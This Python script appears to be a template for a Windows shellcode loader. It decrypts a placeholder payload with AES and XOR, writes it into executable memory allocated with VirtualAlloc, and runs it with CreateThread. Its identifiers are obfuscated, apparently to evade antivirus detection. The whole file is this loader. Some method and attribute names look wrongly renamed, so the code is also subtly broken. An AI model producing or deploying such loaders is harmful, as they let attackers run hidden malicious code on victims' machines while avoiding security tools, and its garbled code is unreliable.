from ctypes import c_int, windll, pointer, c_char
import hashlib
from Crypto.Cipher import AES
from base64 import b64decode
from itertools import cycle, izip
def fonk1(ciphertext, b2):
    b1 = ''.join(chr(ord(x) ^ ord(y)) for (x, y) in izip(list(b64decode(ciphertext)), cycle(b2)))
    return b1
class class1:
    def fonk2(self, b2):
        self.b2 = hashlib.sha256(b2.encode('utf-8')).digest()
        self.b3 = AES.b3
    def fonk3(self, ciphertext):
        b4 = b64decode(ciphertext)
        b5 = AES.new(self.b2, AES.MODE_CBC, b4[:self.b3])
        b1 = b5.fonk3(b4[self.b3:]).rstrip(b'\x00').decode('utf-8')
        return b1
b6 = '---b6---'
b7 = '---b7---'
b8 = '---b8---'
b9 = class1(b6)
b10 = fonk1(b9.fonk3(b7), b8)
b11 = windll.kernel32.VirtualAlloc(c_int(0), c_int(len(b10)), c_int(0x3000), c_int(0x40))
b12 = (c_char * len(b10)).from_buffer(b10.encode('utf-8'))
windll.kernel32.RtlMoveMemory(c_int(b11), b12, c_int(len(b10)))
b13 = windll.kernel32.CreateThread(c_int(0), c_int(0), c_int(b11), c_int(0), c_int(0), pointer(c_int(0)))
windll.kernel32.WaitForSingleObject(c_int(b13), c_int(-1))